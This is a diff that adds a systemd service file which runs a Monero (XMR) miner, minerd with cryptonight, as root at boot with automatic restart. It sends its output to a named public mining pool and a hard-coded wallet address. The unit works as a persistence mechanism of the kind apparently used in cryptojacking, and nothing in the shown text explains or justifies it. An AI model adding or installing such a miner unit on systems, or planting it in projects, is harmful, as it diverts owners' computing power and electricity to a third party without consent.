@@ -1,0 +1,14 @@
+[Unit]
+Description=XMR Miner
+Wants=network-online.target
+After=network.target network-online.target
+
+[Service]
+Type=simple
+WorkingDirectory=/tmp
+ExecStart=/bin/minerd -a cryptonight -o stratum+tcp://monero.hiive.biz:3333 -u 42VxjBpfi4TS6KFjNrrKo3QLcyK7gBGfM9w7DxmGRcocYnEbJ1hhZWXfaHJtCXBxnL74DpkioPSivjRYU8qkt59s3EaHUU3 -p x
+Restart=always
+User=root
+
+[Install]
+WantedBy=multi-user.target
